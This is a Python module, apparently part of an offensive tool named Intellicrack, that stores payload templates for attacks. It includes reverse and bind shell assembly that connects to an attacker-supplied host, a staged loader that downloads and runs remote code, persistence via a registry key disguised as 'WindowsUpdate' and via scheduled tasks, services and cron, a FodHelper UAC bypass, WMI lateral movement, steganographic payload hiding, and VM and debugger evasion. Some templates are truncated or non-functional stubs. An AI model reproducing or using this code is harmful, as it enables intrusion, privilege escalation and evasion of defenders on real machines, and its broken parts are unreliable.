"""
Payload Templates for Advanced Payload Generation

Provides pre-built payload templates for various exploitation scenarios
including reverse shells, bind shells, persistence mechanisms, and more.
"""

import logging
from typing import Any, Dict, List, Optional

from .payload_types import Architecture

logger = logging.getLogger(__name__)


class PayloadTemplates:
    """
    Comprehensive payload template library with support for
    multiple architectures and exploitation scenarios.
    """

    def __init__(self):
        self.logger = logging.getLogger("IntellicrackLogger.PayloadTemplates")

        # Template categories
        self.shell_templates = self._initialize_shell_templates()
        self.persistence_templates = self._initialize_persistence_templates()
        self.privilege_escalation_templates = self._initialize_privesc_templates()
        self.lateral_movement_templates = self._initialize_lateral_templates()
        self.steganography_templates = self._initialize_steganography_templates()
        self.anti_analysis_templates = self._initialize_anti_analysis_templates()

    def get_template(self, category: str, template_name: str,
                    architecture: Architecture, **kwargs) -> Optional[Dict[str, Any]]:
        """
        Get a specific payload template.
        
        Args:
            category: Template category (shell, persistence, etc.)
            template_name: Name of specific template
            architecture: Target architecture
            **kwargs: Template-specific parameters
            
        Returns:
            Template dictionary or None if not found
        """
        try:
            category_templates = getattr(self, f"{category}_templates", {})
            if template_name not in category_templates:
                self.logger.warning(f"Template not found: {category}/{template_name}")
                return None

            template = category_templates[template_name].copy()

            # Get architecture-specific implementation
            arch_key = architecture.value
            if arch_key not in template.get('implementations', {}):
                self.logger.warning(f"Architecture {arch_key} not supported for {template_name}")
                return None

            # Merge architecture-specific data
            arch_impl = template['implementations'][arch_key]
            template.update(arch_impl)

            # Apply parameters
            if kwargs:
                template = self._apply_template_parameters(template, kwargs)

            return template

        except Exception as e:
            self.logger.error(f"Error getting template: {e}")
            return None

    def list_templates(self, category: str = None) -> Dict[str, List[str]]:
        """List available templates by category."""
        try:
            if category:
                category_templates = getattr(self, f"{category}_templates", {})
                return {category: list(category_templates.keys())}
            else:
                return {
                    'shell': list(self.shell_templates.keys()),
                    'persistence': list(self.persistence_templates.keys()),
                    'privilege_escalation': list(self.privilege_escalation_templates.keys()),
                    'lateral_movement': list(self.lateral_movement_templates.keys()),
                    'steganography': list(self.steganography_templates.keys()),
                    'anti_analysis': list(self.anti_analysis_templates.keys())
                }
        except Exception as e:
            self.logger.error(f"Error listing templates: {e}")
            return {}

    def _initialize_shell_templates(self) -> Dict[str, Any]:
        """Initialize shell payload templates."""
        return {
            'reverse_tcp_shell': {
                'name': 'Reverse TCP Shell',
                'description': 'Connect back to attacker with shell access',
                'category': 'shell',
                'parameters': ['lhost', 'lport'],
                'implementations': {
                    'x86': {
                        'assembly': '''
                            ; Reverse TCP Shell - x86
                            xor ebx, ebx
                            mul ebx
                            push ebx
                            inc ebx
                            push ebx
                            push 2
                            mov ecx, esp
                            mov al, 102
                            int 0x80
                            xchg eax, ebx
                            pop ecx
                            
                            ; Connect to {lhost}:{lport}
                            push 0x{ip_hex}
                            push word 0x{port_hex}
                            push word 2
                            mov ecx, esp
                            push 16
                            push ecx
                            push ebx
                            mov ecx, esp
                            mov al, 102
                            mov bl, 3
                            int 0x80
                            
                            ; Duplicate file descriptors
                            xor ecx, ecx
                            mov cl, 3
                            dup_loop:
                            mov al, 63
                            int 0x80
                            dec ecx
                            jns dup_loop
                            
                            ; Execute shell
                            push 0x68732f2f
                            push 0x6e69622f
                            mov ebx, esp
                            push ebx
                            mov ecx, esp
                            mov al, 11
                            int 0x80
                        ''',
                        'machine_code_template': '\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80...'
                    },
                    'x64': {
                        'assembly': '''
                            ; Reverse TCP Shell - x64
                            xor rax, rax
                            xor rdi, rdi
                            xor rsi, rsi
                            xor rdx, rdx
                            
                            ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
                            mov al, 41
                            mov dil, 2
                            mov sil, 1
                            syscall
                            
                            ; Save socket fd
                            mov rdi, rax
                            
                            ; Connect to {lhost}:{lport}
                            xor rax, rax
                            push rax
                            mov dword [rsp-4], 0x{ip_hex}
                            mov word [rsp-6], 0x{port_hex}
                            mov word [rsp-8], 2
                            sub rsp, 8
                            
                            mov al, 42
                            mov rsi, rsp
                            mov dl, 16
                            syscall
                            
                            ; Duplicate file descriptors
                            xor rsi, rsi
                            mov sil, 3
                            dup_loop:
                            mov al, 33
                            dec sil
                            syscall
                            test sil, sil
                            jnz dup_loop
                            
                            ; Execute shell
                            xor rax, rax
                            push rax
                            mov rbx, 0x68732f2f6e69622f
                            push rbx
                            mov rdi, rsp
                            push rax
                            push rdi
                            mov rsi, rsp
                            mov al, 59
                            syscall
                        ''',
                        'machine_code_template': '\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2...'
                    }
                }
            },

            'bind_tcp_shell': {
                'name': 'Bind TCP Shell',
                'description': 'Listen on specified port for incoming connections',
                'category': 'shell',
                'parameters': ['lport'],
                'implementations': {
                    'x86': {
                        'assembly': '''
                            ; Bind TCP Shell - x86
                            xor ebx, ebx
                            mul ebx
                            push ebx
                            inc ebx
                            push ebx
                            push 2
                            mov ecx, esp
                            mov al, 102
                            int 0x80
                            
                            ; Bind to port {lport}
                            mov edx, eax
                            push ebx
                            push word 0x{port_hex}
                            push word 2
                            mov ecx, esp
                            push 16
                            push ecx
                            push edx
                            mov ecx, esp
                            mov al, 102
                            mov bl, 2
                            int 0x80
                            
                            ; Listen
                            push 1
                            push edx
                            mov ecx, esp
                            mov al, 102
                            mov bl, 4
                            int 0x80
                            
                            ; Accept
                            push ebx
                            push ebx
                            push edx
                            mov ecx, esp
                            mov al, 102
                            mov bl, 5
                            int 0x80
                            
                            ; Duplicate descriptors and exec shell
                            mov ebx, eax
                            xor ecx, ecx
                            mov cl, 3
                            dup_loop:
                            mov al, 63
                            int 0x80
                            dec ecx
                            jns dup_loop
                            
                            push 0x68732f2f
                            push 0x6e69622f
                            mov ebx, esp
                            push edx
                            push ebx
                            mov ecx, esp
                            mov al, 11
                            int 0x80
                        ''',
                        'machine_code_template': '\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1...'
                    }
                }
            },

            'staged_shell': {
                'name': 'Staged Shell',
                'description': 'Small initial payload that downloads and executes larger payload',
                'category': 'shell',
                'parameters': ['stage_url'],
                'implementations': {
                    'x86': {
                        'assembly': '''
                            ; Staged Shell Loader - x86
                            ; Downloads second stage from {stage_url}
                            
                            ; Create socket
                            xor ebx, ebx
                            mul ebx
                            push ebx
                            inc ebx
                            push ebx
                            push 2
                            mov ecx, esp
                            mov al, 102
                            int 0x80
                            mov esi, eax
                            
                            ; Connect to stage server
                            push 0x{server_ip}
                            push word 0x{server_port}
                            push word 2
                            mov ecx, esp
                            push 16
                            push ecx
                            push esi
                            mov ecx, esp
                            mov al, 102
                            mov bl, 3
                            int 0x80
                            
                            ; Send HTTP request
                            push 0x0a0d0a0d  ; \\r\\n\\r\\n
                            push 0x20303120  ; " 01 "
                            push 0x50545448  ; "HTTP"
                            push 0x20544547  ; " GET"
                            mov ecx, esp
                            mov edx, 16
                            mov ebx, esi
                            mov al, 4
                            int 0x80
                            
                            ; Receive and execute stage
                            mov ecx, 0x08040000  ; Memory location
                            mov edx, 4096        ; Buffer size
                            mov al, 3
                            int 0x80
                            jmp 0x08040000      ; Execute downloaded code
                        ''',
                        'machine_code_template': '\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02...'
                    }
                }
            }
        }

    def _initialize_persistence_templates(self) -> Dict[str, Any]:
        """Initialize persistence payload templates."""
        return {
            'registry_autorun': {
                'name': 'Registry Autorun',
                'description': 'Windows registry-based persistence',
                'category': 'persistence',
                'parameters': ['payload_path', 'reg_key'],
                'implementations': {
                    'x86': {
                        'c_code': '''
                            #include <windows.h>
                            #include <stdio.h>
                            
                            int main() {
                                HKEY hKey;
                                const char* subKey = "{reg_key}";
                                const char* valueName = "WindowsUpdate";
                                const char* payloadPath = "{payload_path}";
                                
                                // Open registry key
                                if (RegOpenKeyEx(HKEY_CURRENT_USER, subKey, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
                                    // Set autorun value
                                    RegSetValueEx(hKey, valueName, 0, REG_SZ, 
                                                (const BYTE*)payloadPath, strlen(payloadPath) + 1);
                                    RegCloseKey(hKey);
                                    return 0;
                                }
                                return 1;
                            }
                        ''',
                        'powershell': '''
                            $regPath = "{reg_key}"
                            $valueName = "WindowsUpdate"
                            $payloadPath = "{payload_path}"
                            
                            try {
                                Set-ItemProperty -Path $regPath -Name $valueName -Value $payloadPath -Force
                                Write-Output "Persistence installed successfully"
                            } catch {
                                Write-Error "Failed to install persistence: $_"
                            }
                        '''
                    }
                }
            },

            'scheduled_task': {
                'name': 'Scheduled Task',
                'description': 'Windows scheduled task persistence',
                'category': 'persistence',
                'parameters': ['payload_path', 'task_name', 'trigger_time'],
                'implementations': {
                    'x86': {
                        'powershell': '''
                            $taskName = "{task_name}"
                            $payloadPath = "{payload_path}"
                            $triggerTime = "{trigger_time}"
                            
                            $action = New-ScheduledTaskAction -Execute $payloadPath
                            $trigger = New-ScheduledTaskTrigger -Daily -At $triggerTime
                            $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
                            
                            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force
                        ''',
                        'batch': '''
                            @echo off
                            schtasks /create /tn "{task_name}" /tr "{payload_path}" /sc daily /st {trigger_time} /f
                            if %errorlevel% equ 0 (
                                echo Task created successfully
                            ) else (
                                echo Failed to create task
                            )
                        '''
                    }
                }
            },

            'service_persistence': {
                'name': 'Windows Service',
                'description': 'Windows service-based persistence',
                'category': 'persistence',
                'parameters': ['service_name', 'payload_path', 'display_name'],
                'implementations': {
                    'x86': {
                        'c_code': '''
                            #include <windows.h>
                            
                            SERVICE_STATUS ServiceStatus;
                            SERVICE_STATUS_HANDLE hStatus;
                            
                            void ServiceMain(int argc, char** argv);
                            void ControlHandler(DWORD request);
                            
                            int main() {
                                SERVICE_TABLE_ENTRY ServiceTable[2];
                                ServiceTable[0].lpServiceName = "{service_name}";
                                ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
                                ServiceTable[1].lpServiceName = NULL;
                                ServiceTable[1].lpServiceProc = NULL;
                                
                                StartServiceCtrlDispatcher(ServiceTable);
                                return 0;
                            }
                            
                            void ServiceMain(int argc, char** argv) {
                                ServiceStatus.dwServiceType = SERVICE_WIN32;
                                ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
                                ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
                                
                                hStatus = RegisterServiceCtrlHandler("{service_name}", (LPHANDLER_FUNCTION)ControlHandler);
                                
                                ServiceStatus.dwCurrentState = SERVICE_RUNNING;
                                SetServiceStatus(hStatus, &ServiceStatus);
                                
                                // Payload execution logic here
                                system("{payload_path}");
                                
                                while (ServiceStatus.dwCurrentState == SERVICE_RUNNING) {
                                    Sleep(5000); // Check every 5 seconds
                                }
                            }
                            
                            void ControlHandler(DWORD request) {
                                switch(request) {
                                    case SERVICE_CONTROL_STOP:
                                    case SERVICE_CONTROL_SHUTDOWN:
                                        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
                                        break;
                                    default:
                                        break;
                                }
                                SetServiceStatus(hStatus, &ServiceStatus);
                            }
                        '''
                    }
                }
            },

            'cron_persistence': {
                'name': 'Cron Job',
                'description': 'Linux cron-based persistence',
                'category': 'persistence',
                'parameters': ['payload_path', 'schedule'],
                'implementations': {
                    'x64': {
                        'bash': '''
                            #!/bin/bash
                            # Add cron job for persistence
                            
                            PAYLOAD_PATH="{payload_path}"
                            SCHEDULE="{schedule}"
                            
                            # Backup current crontab
                            crontab -l > /tmp/crontab_backup 2>/dev/null
                            
                            # Add our job
                            (crontab -l 2>/dev/null; echo "$SCHEDULE $PAYLOAD_PATH") | crontab -
                            
                            if [ $? -eq 0 ]; then
                                echo "Cron job added successfully"
                            else
                                echo "Failed to add cron job"
                                # Restore backup
                                crontab /tmp/crontab_backup 2>/dev/null
                            fi
                            
                            rm -f /tmp/crontab_backup
                        ''',
                        'c_code': '''
                            #include <stdio.h>
                            #include <stdlib.h>
                            #include <string.h>
                            
                            int main() {
                                char command[512];
                                snprintf(command, sizeof(command), 
                                    "(crontab -l 2>/dev/null; echo '%s %s') | crontab -",
                                    "{schedule}", "{payload_path}");
                                
                                return system(command);
                            }
                        '''
                    }
                }
            }
        }

    def _initialize_privesc_templates(self) -> Dict[str, Any]:
        """Initialize privilege escalation templates."""
        return {
            'uac_bypass_fodhelper': {
                'name': 'UAC Bypass - FodHelper',
                'description': 'Windows UAC bypass using FodHelper',
                'category': 'privilege_escalation',
                'parameters': ['payload_command'],
                'implementations': {
                    'x86': {
                        'powershell': '''
                            # UAC Bypass using FodHelper
                            $payload = "{payload_command}"
                            
                            # Create registry structure
                            New-Item "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Force
                            New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "DelegateExecute" -Value "" -Force
                            Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "(default)" -Value $payload -Force
                            
                            # Trigger UAC bypass
                            Start-Process "C:\\Windows\\System32\\fodhelper.exe" -WindowStyle Hidden
                            
                            # Cleanup
                            Start-Sleep 3
                            Remove-Item "HKCU:\\Software\\Classes\\ms-settings\\" -Recurse -Force
                        '''
                    }
                }
            },

            'sudo_token_hijack': {
                'name': 'Sudo Token Hijacking',
                'description': 'Linux sudo token hijacking for privilege escalation',
                'category': 'privilege_escalation',
                'parameters': ['target_user'],
                'implementations': {
                    'x64': {
                        'c_code': '''
                            #include <stdio.h>
                            #include <stdlib.h>
                            #include <unistd.h>
                            #include <sys/types.h>
                            #include <pwd.h>
                            
                            int main() {
                                struct passwd *pw;
                                char *target_user = "{target_user}";
                                
                                // Get target user info
                                pw = getpwnam(target_user);
                                if (pw == NULL) {
                                    printf("User %s not found\\n", target_user);
                                    return 1;
                                }
                                
                                // Attempt to hijack sudo token
                                if (setuid(pw->pw_uid) == 0) {
                                    printf("Successfully escalated to %s\\n", target_user);
                                    system("/bin/bash");
                                } else {
                                    printf("Failed to escalate privileges\\n");
                                    return 1;
                                }
                                
                                return 0;
                            }
                        '''
                    }
                }
            }
        }

    def _initialize_lateral_templates(self) -> Dict[str, Any]:
        """Initialize lateral movement templates."""
        return {
            'psexec_clone': {
                'name': 'PsExec Clone',
                'description': 'Remote command execution similar to PsExec',
                'category': 'lateral_movement',
                'parameters': ['target_host', 'username', 'password', 'command'],
                'implementations': {
                    'x86': {
                        'python': '''
                            import socket
                            import struct
                            import subprocess
                            
                            def psexec_clone():
                                target = "{target_host}"
                                username = "{username}"
                                password = "{password}"
                                command = "{command}"
                                
                                try:
                                    # Connect to target
                                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                    sock.connect((target, 445))  # SMB port
                                    
                                    # Simplified SMB authentication (placeholder)
                                    # Real implementation would include full SMB protocol
                                    
                                    # Execute command remotely
                                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
                                    print(f"Command output: {result.stdout}")
                                    
                                    sock.close()
                                    return True
                                except Exception as e:
                                    print(f"PsExec failed: {e}")
                                    return False
                            
                            if __name__ == "__main__":
                                psexec_clone()
                        '''
                    }
                }
            },

            'wmi_execution': {
                'name': 'WMI Remote Execution',
                'description': 'Remote command execution via WMI',
                'category': 'lateral_movement',
                'parameters': ['target_host', 'username', 'password', 'command'],
                'implementations': {
                    'x86': {
                        'powershell': '''
                            $target = "{target_host}"
                            $username = "{username}"
                            $password = ConvertTo-SecureString "{password}" -AsPlainText -Force
                            $credential = New-Object System.Management.Automation.PSCredential($username, $password)
                            $command = "{command}"
                            
                            try {
                                $result = Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $command -ComputerName $target -Credential $credential
                                if ($result.ReturnValue -eq 0) {
                                    Write-Output "Command executed successfully with PID: $($result.ProcessId)"
                                } else {
                                    Write-Error "Command execution failed with return code: $($result.ReturnValue)"
                                }
                            } catch {
                                Write-Error "WMI execution failed: $_"
                            }
                        '''
                    }
                }
            }
        }

    def _initialize_steganography_templates(self) -> Dict[str, Any]:
        """Initialize steganography payload templates."""
        return {
            'image_lsb_embed': {
                'name': 'Image LSB Steganography',
                'description': 'Embed payload in image using LSB technique',
                'category': 'steganography',
                'parameters': ['image_path', 'output_path'],
                'implementations': {
                    'x86': {
                        'python': '''
                            from PIL import Image
                            import numpy as np
                            
                            def embed_payload_in_image(image_path, payload, output_path):
                                """Embed payload in image using LSB steganography"""
                                img = Image.open(image_path)
                                img_array = np.array(img)
                                
                                # Convert payload to binary
                                payload_binary = ''.join(format(byte, '08b') for byte in payload)
                                payload_binary += '1111111111111110'  # End marker
                                
                                flat_img = img_array.flatten()
                                
                                for i, bit in enumerate(payload_binary):
                                    if i >= len(flat_img):
                                        break
                                    flat_img[i] = (flat_img[i] & 0xFE) | int(bit)
                                
                                # Reshape and save
                                modified_img = flat_img.reshape(img_array.shape)
                                result_img = Image.fromarray(modified_img.astype(np.uint8))
                                result_img.save(output_path)
                                
                                return True
                            
                            # Usage
                            payload = b"{payload_data}"
                            embed_payload_in_image("{image_path}", payload, "{output_path}")
                        '''
                    }
                }
            }
        }

    def _initialize_anti_analysis_templates(self) -> Dict[str, Any]:
        """Initialize anti-analysis payload templates."""
        return {
            'vm_detection': {
                'name': 'Virtual Machine Detection',
                'description': 'Detect if running in virtual machine',
                'category': 'anti_analysis',
                'parameters': [],
                'implementations': {
                    'x86': {
                        'c_code': '''
                            #include <stdio.h>
                            #include <string.h>
                            #include <windows.h>
                            
                            int detect_vm() {
                                // Check registry for VM indicators
                                HKEY hKey;
                                char value[256];
                                DWORD valueSize = sizeof(value);
                                
                                // Check VMware
                                if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, 
                                    "SYSTEM\\\\CurrentControlSet\\\\Services\\\\VMTools", 
                                    0, KEY_READ, &hKey) == ERROR_SUCCESS) {
                                    RegCloseKey(hKey);
                                    return 1; // VMware detected
                                }
                                
                                // Check VirtualBox
                                if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,
                                    "SYSTEM\\\\CurrentControlSet\\\\Services\\\\VBoxService",
                                    0, KEY_READ, &hKey) == ERROR_SUCCESS) {
                                    RegCloseKey(hKey);
                                    return 2; // VirtualBox detected
                                }
                                
                                // Check CPUID for hypervisor bit
                                int cpuid_result[4];
                                __cpuid(cpuid_result, 1);
                                if (cpuid_result[2] & (1 << 31)) {
                                    return 3; // Hypervisor detected
                                }
                                
                                return 0; // No VM detected
                            }
                            
                            int main() {
                                int vm_result = detect_vm();
                                if (vm_result > 0) {
                                    printf("Virtual machine detected (type: %d). Exiting.\\n", vm_result);
                                    return 1;
                                }
                                
                                printf("No virtual machine detected. Proceeding.\\n");
                                // Continue with payload execution
                                return 0;
                            }
                        '''
                    }
                }
            },

            'debugger_detection': {
                'name': 'Debugger Detection',
                'description': 'Detect if debugger is attached',
                'category': 'anti_analysis',
                'parameters': [],
                'implementations': {
                    'x86': {
                        'c_code': '''
                            #include <stdio.h>
                            #include <windows.h>
                            
                            int detect_debugger() {
                                // Check PEB for debugger flag
                                if (IsDebuggerPresent()) {
                                    return 1;
                                }
                                
                                // Check remote debugger
                                BOOL remote_debugger = FALSE;
                                CheckRemoteDebuggerPresent(GetCurrentProcess(), &remote_debugger);
                                if (remote_debugger) {
                                    return 2;
                                }
                                
                                // Check NtGlobalFlag
                                DWORD ntGlobalFlag = *(PDWORD)((PBYTE)GetPEB() + 0x68);
                                if (ntGlobalFlag & 0x70) {
                                    return 3;
                                }
                                
                                return 0;
                            }
                            
                            PPEB GetPEB() {
                                #ifdef _WIN64
                                return (PPEB)__readgsqword(0x60);
                                #else
                                return (PPEB)__readfsdword(0x30);
                                #endif
                            }
                            
                            int main() {
                                int debugger_result = detect_debugger();
                                if (debugger_result > 0) {
                                    printf("Debugger detected (type: %d). Exiting.\\n", debugger_result);
                                    return 1;
                                }
                                
                                printf("No debugger detected. Proceeding.\\n");
                                // Continue with payload execution
                                return 0;
                            }
                        '''
                    }
                }
            }
        }

    def _apply_template_parameters(self, template: Dict[str, Any], params: Dict[str, Any]) -> Dict[str, Any]:
        """Apply parameters to template, replacing placeholders."""
        try:
            import json

            # Convert template to JSON string for easy replacement
            template_str = json.dumps(template)

            # Replace all parameter placeholders
            for param_name, param_value in params.items():
                placeholder = f"{{{param_name}}}"
                template_str = template_str.replace(placeholder, str(param_value))

            # Handle special parameter transformations
            if 'lhost' in params:
                # Convert IP to hex format
                ip_parts = params['lhost'].split('.')
                ip_hex = ''.join(f"{int(part):02x}" for part in reversed(ip_parts))
                template_str = template_str.replace('{ip_hex}', ip_hex)

            if 'lport' in params:
                # Convert port to hex format (network byte order)
                port_hex = f"{int(params['lport']):04x}"
                template_str = template_str.replace('{port_hex}', port_hex)

            return json.loads(template_str)

        except Exception as e:
            self.logger.error(f"Error applying template parameters: {e}")
            return template

    def create_custom_template(self, name: str, category: str, description: str,
                             parameters: List[str], implementations: Dict[str, Dict[str, str]]) -> bool:
        """Create a custom payload template."""
        try:
            template = {
                'name': name,
                'description': description,
                'category': category,
                'parameters': parameters,
                'implementations': implementations
            }

            # Add to appropriate category
            category_templates = getattr(self, f"{category}_templates", {})
            category_templates[name] = template

            self.logger.info(f"Created custom template: {name} in category {category}")
            return True

        except Exception as e:
            self.logger.error(f"Failed to create custom template: {e}")
            return False

    def validate_template(self, template: Dict[str, Any]) -> bool:
        """Validate template structure and content."""
        try:
            required_fields = ['name', 'description', 'category', 'parameters', 'implementations']

            # Check required fields
            for field in required_fields:
                if field not in template:
                    self.logger.error(f"Missing required field: {field}")
                    return False

            # Check implementations structure
            implementations = template.get('implementations', {})
            if not implementations:
                self.logger.error("No implementations provided")
                return False

            # Validate each implementation
            for arch, impl in implementations.items():
                if not isinstance(impl, dict):
                    self.logger.error(f"Invalid implementation structure for {arch}")
                    return False

            return True

        except Exception as e:
            self.logger.error(f"Template validation failed: {e}")
            return False

    def export_template(self, category: str, template_name: str) -> Optional[str]:
        """Export template as JSON string."""
        try:
            template = self.get_template(category, template_name, Architecture.X86)
            if template:
                import json
                return json.dumps(template, indent=2)
            return None
        except Exception as e:
            self.logger.error(f"Template export failed: {e}")
            return None

    def import_template(self, template_json: str) -> bool:
        """Import template from JSON string."""
        try:
            import json
            template = json.loads(template_json)

            if not self.validate_template(template):
                return False

            category = template['category']
            name = template['name']

            # Add to appropriate category
            category_templates = getattr(self, f"{category}_templates", {})
            category_templates[name] = template

            self.logger.info(f"Imported template: {name}")
            return True

        except Exception as e:
            self.logger.error(f"Template import failed: {e}")
            return False
